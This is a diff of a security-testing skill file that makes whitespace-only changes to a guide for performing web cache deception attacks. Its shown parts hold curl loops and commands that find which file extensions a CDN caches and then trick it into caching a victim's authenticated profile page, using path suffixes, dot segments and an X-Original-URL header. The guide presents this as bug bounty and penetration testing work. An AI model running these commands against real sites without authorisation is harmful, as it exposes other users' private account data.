@@ -1,11 +1,11 @@
 ---
 name: performing-web-cache-deception-attack
 description: Executes web cache deception attacks by exploiting path normalization
-  discrepancies between CDN/reverse-proxy caching layers (Cloudflare, Akamai, Varnish,
-  Nginx) and origin servers to cache and retrieve sensitive authenticated content.
-  Use when testing applications behind CDNs for cache-key misconfigurations, during
-  bug bounty hunting on aggressively cached sites, or when assessing sensitive data
-  exposure through cache layer misconfiguration.
+ discrepancies between CDN/reverse-proxy caching layers (Cloudflare, Akamai, Varnish,
+ Nginx) and origin servers to cache and retrieve sensitive authenticated content.
+ Use when testing applications behind CDNs for cache-key misconfigurations, during
+ bug bounty hunting on aggressively cached sites, or when assessing sensitive data
+ exposure through cache layer misconfiguration.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -66,8 +66,8 @@ curl -I "http://target.com/static/style.css"
 
 # Identify which extensions are cached
 for ext in css js png jpg gif svg ico woff woff2 pdf; do
-  echo -n "$ext: "
-  curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
+ echo -n "$ext: "
+ curl -sI "http://target.com/test.$ext" | grep -i "x-cache\|cf-cache"
 done
 ```
 
@@ -86,11 +86,11 @@ curl "http://target.com/account/profile/anything.css"
 
 # Test various extensions
 for ext in css js png jpg svg ico woff2; do
-  curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
-  sleep 2
-  echo -n "$ext: "
-  curl -s "http://target.com/account/profile/x.$ext" | head -c 200
-  echo
+ curl -b "session=VICTIM_SESSION" "http://target.com/account/profile/x.$ext" -o /dev/null
+ sleep 2
+ echo -n "$ext: "
+ curl -s "http://target.com/account/profile/x.$ext" | head -c 200
+ echo
 done
 ```
 
@@ -143,11 +143,11 @@ curl -b "session=VICTIM" "http://target.com/account/profile?cachebuster=123.css"
 
 # Test if the CDN uses the full path or normalized path as cache key
 curl -b "session=VICTIM" "http://target.com/account/profile/./style.css"
-curl "http://target.com/account/profile/./style.css"  # Check if cached
+curl "http://target.com/account/profile/./style.css" # Check if cached
 
 # Header-based cache key manipulation
 curl -b "session=VICTIM" -H "X-Original-URL: /account/profile" \
-  "http://target.com/static/cached.css"
+ "http://target.com/static/cached.css"
 ```
 
 ### Step 6 — Verify and Document the Attack
